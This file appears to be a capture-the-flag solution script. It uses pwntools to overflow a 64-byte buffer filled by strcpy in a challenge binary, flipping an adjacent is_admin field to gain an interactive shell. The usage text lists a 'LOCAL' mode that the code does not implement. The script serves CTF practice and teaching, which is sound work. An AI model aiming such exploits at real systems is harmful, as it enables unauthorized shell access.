#!/usr/bin/env python3
"""
Exploit for: not_too_much — BOF_64
Category   : pwn / stack buffer overflow

Vulnerability:
    vulnerable_function() copies argv[1] into a packed struct:
        char buffer[64]   — bytes  0..63
        int  is_admin     — bytes 64..67
        int  do_not_exagerate — bytes 68..71

    strcpy() has no bounds check, so 65 bytes overflow 'buffer' and
    write 0x41 ('A') into is_admin, passing the admin check.
    IMPORTANT: stay <= 68 bytes to keep do_not_exagerate == 0,
    otherwise the shell is NOT spawned.

Usage:
    # Remote (default)
    python3 exploit.py

    # Specify custom host/port
    python3 exploit.py HOST PORT

    # Local testing
    python3 exploit.py LOCAL
"""

from pwn import *
import sys

# CHANGEME
REMOTE_HOST = "127.0.0.1"
REMOTE_PORT = 4444
BUFFER_SIZE = 64
PAYLOAD = b"A" * (BUFFER_SIZE + 1)

def get_target() -> tube:
    args = sys.argv[1:]

    host = args[0] if len(args) > 0 else REMOTE_HOST
    port = int(args[1]) if len(args) > 1 else REMOTE_PORT

    log.info(f"[REMOTE] Connecting to {host}:{port}")
    return remote(host, port)

def main():
    target = get_target()

    banner = target.recvuntil(b"Example:", timeout=5)
    log.info("Banner received:\n" + banner.decode(errors="replace"))

    target.recvline(timeout=3)
    target.recvline(timeout=3)

    log.info(f"Sending payload: {PAYLOAD!r} ({len(PAYLOAD)} bytes)")
    target.sendline(PAYLOAD)

    log.success("Payload sent — dropping into interactive shell (Ctrl-C to exit)")
    target.interactive()

if __name__ == "__main__":
    main()
